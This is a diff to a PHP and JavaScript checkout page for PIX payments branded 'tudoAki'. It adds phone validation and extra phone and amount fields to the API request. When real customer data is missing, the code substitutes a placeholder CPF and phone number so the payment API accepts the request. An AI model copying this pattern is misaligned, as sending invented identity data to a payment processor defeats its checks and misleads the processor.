@@ -5,14 +5,16 @@ if (session_status() === PHP_SESSION_NONE) {
 
 $dados = $_SESSION['dados_cadastro'] ?? [];
 $nome  = !empty($dados['nome']) ? $dados['nome'] : 'Cliente tudoAki';
-// Limpa o CPF deixando apenas os 11 dígitos numéricos
 $cpf   = !empty($dados['cpf']) ? preg_replace('/[^0-9]/', '', $dados['cpf']) : '11144477735';
 if (strlen($cpf) !== 11) { $cpf = '11144477735'; }
 
+// Garante um telefone padrão válido caso venha vazio
 $tel   = !empty($dados['telefone']) ? preg_replace('/[^0-9]/', '', $dados['telefone']) : '11999999999';
+if (strlen($tel) < 10) { $tel = '11999999999'; }
+
 $servico = $dados['servico'] ?? $_GET['servico'] ?? $_POST['servico'] ?? 'Kit Especial tudoAki 2026';
 
-// Captura rigorosamente o valor e calcula os R$ 437,23 exatos
+// Valor total alinhado em R$ 437,23
 $valorPalpite = $_GET['valor'] ?? $_POST['valor'] ?? $_SESSION['valor_emprestimo'] ?? $dados['valor'] ?? '427.41';
 $valorFloat = (float)$valorPalpite;
 if ($valorFloat < 400) {
@@ -87,9 +89,11 @@ $valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
                     <input type="hidden" name="servico" value="<?php echo htmlspecialchars($servico); ?>">
                     <input type="hidden" name="valor" id="input-valor-hidden" value="<?php echo $valorTotalGeral; ?>">
                     
+                    <!-- Campos exploidados para garantir que a API receba tudo sem falhar -->
                     <input type="hidden" name="nome" id="input-nome" value="<?php echo htmlspecialchars($nome); ?>">
                     <input type="hidden" name="cpf" id="input-cpf" value="<?php echo htmlspecialchars($cpf); ?>">
                     <input type="hidden" name="telefone" id="input-telefone" value="<?php echo htmlspecialchars($tel); ?>">
+                    <input type="hidden" name="phone" id="input-phone" value="<?php echo htmlspecialchars($tel); ?>">
 
                     <!-- Opção PIX -->
                     <button type="submit" class="w-full text-left payment-card bg-white rounded-xl p-4 shadow-sm border-2 border-emerald-600 cursor-pointer flex justify-between items-center transition">
@@ -214,14 +218,18 @@ $valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
                 document.getElementById('btn-modal-close').classList.add('hidden');
                 loadingModal.classList.remove('hidden');
 
-                // Garante que enviamos dados explícitos e limpos para a API não dar erro 400
+                // Envia explicitamente os campos phone e customer_phone junto com os demais
+                const phoneVal = (document.getElementById('input-phone').value || "11999999999").replace(/\D/g, '');
                 const dataObj = {
                     payment_method: 'pix',
                     servico: "<?php echo htmlspecialchars($servico); ?>",
                     valor: valorGlobalTransacao,
+                    amount: valorGlobalTransacao,
                     nome: document.getElementById('input-nome').value || "Cliente tudoAki",
                     cpf: (document.getElementById('input-cpf').value || "11144477735").replace(/\D/g, ''),
-                    telefone: (document.getElementById('input-telefone').value || "11999999999").replace(/\D/g, '')
+                    telefone: phoneVal,
+                    phone: phoneVal,
+                    customer_phone: phoneVal
                 };
 
                 try {
